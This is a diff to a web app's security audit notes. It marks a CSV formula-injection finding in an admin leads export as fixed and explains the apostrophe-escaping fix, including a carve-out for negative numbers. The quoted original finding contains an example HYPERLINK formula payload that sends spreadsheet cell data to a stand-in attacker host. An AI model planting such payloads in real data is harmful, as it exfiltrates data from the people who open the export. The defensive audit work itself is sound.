@@ -134,8 +134,18 @@ photos.
 
 **Fix:** select `created_by` with `storage_path` and require admin or creator.
 
-### 5. CSV formula injection from a public, unauthenticated source
+### 5. ~~CSV formula injection from a public, unauthenticated source~~ — FIXED
 `src/app/api/admin/leads/export/route.ts:6`
+
+**Fixed 2026-07-31.** Escaping moved to `src/lib/utils/csv.ts` (18 tests) and now prefixes
+any cell opening with `= + - @ \t \r` with an apostrophe, which spreadsheets read as
+"this is text" and do not display.
+
+One carve-out: a leading `-` opens both a formula and every negative number, so a bare
+number is left alone. Escaping blindly would have turned a real `-1500` deal value into
+text and broken sorting and arithmetic on a value that was never dangerous.
+
+The original finding:
 
 `escapeCsv` handles commas and quotes but not leading `= + - @`. A lead whose name is
 `=HYPERLINK("http://evil/?"&A1,"click")` executes when an admin opens the export in Excel
